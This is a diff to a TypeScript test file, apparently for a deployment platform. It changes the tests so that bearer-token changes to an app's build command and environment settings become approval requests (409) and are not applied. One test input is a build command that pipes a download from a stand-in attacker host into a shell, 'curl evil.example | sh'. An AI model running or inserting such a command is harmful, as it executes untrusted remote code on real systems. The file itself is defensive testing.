@@ -178,16 +178,16 @@ for (const backend of backends) {
 				rpcRequest('apps.environments.put', { appId: 'app', env: 'prod', environment: { ...envelopes, triggerRef: 'refs/heads/main', ...environment } })
 			const asPerson = f.as(manager)
 
-			// With a bearer the change waits for a person (ADR-0083 §6): the build as a request, and the put, whose request takes
-			// no provider envelope in this release, refused.
+			// With a bearer the change waits for a person (ADR-0083 §6): the build and the put each as a request.
 			const asked = await rpcResult(bearer(rpcRequest('apps.update', { appId: 'app', app: { buildCmd: 'curl evil.example | sh' } })), asPerson, {
 				consoleOrigin: 'https://control.test',
 			})
 			expect(asked.status).toBe(409)
 			expect(await asked.text()).toContain('https://control.test/approvals/requests/')
-			expect((await rpcResult(bearer(put({ triggerRef: 'refs/heads/unreviewed' })), asPerson)).status).toBe(400)
-			expect((await rpcResult(bearer(put({ domain: 'evil.example' })), asPerson)).status).toBe(400)
-			expect((await rpcResult(bearer(put({ publicOrigin: 'https://evil.example' })), asPerson)).status).toBe(400)
+			const asking = { consoleOrigin: 'https://control.test' }
+			expect((await rpcResult(bearer(put({ triggerRef: 'refs/heads/unreviewed' })), asPerson, asking)).status).toBe(409)
+			expect((await rpcResult(bearer(put({ domain: 'evil.example' })), asPerson, asking)).status).toBe(409)
+			expect((await rpcResult(bearer(put({ publicOrigin: 'https://evil.example' })), asPerson, asking)).status).toBe(409)
 			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build' })
 			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ trigger_ref: 'refs/heads/main', domain: null, public_origin: null })
 
